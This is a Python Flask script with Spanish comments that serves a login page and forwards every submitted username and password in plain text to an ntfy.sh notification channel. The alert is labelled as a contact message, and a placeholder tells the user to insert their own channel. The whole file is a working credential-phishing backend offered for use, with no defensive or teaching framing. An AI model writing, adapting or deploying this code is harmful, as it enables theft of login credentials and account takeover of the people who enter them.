from flask import Flask, render_template, request
import requests

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        mensaje = f"📥 Nuevo login:\n👤 Usuario: {username}\n🔒 Contraseña: {password}"

        try:
            # Enviar a ntfy.sh
            response = requests.post(
                "https://ntfy.sh/YOUR_LESS0",  # ← CAMBIA ESTO por tu canal único
                data=mensaje.encode('utf-8'),
                headers={
                    "Title": "Nuevo mensaje de contacto",
                    "Priority": "high"
                }
            )
            return "✅ Mensaje enviado con éxito!", 200
        except Exception as e:
            return f"❌ Error al enviar: {str(e)}", 500

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
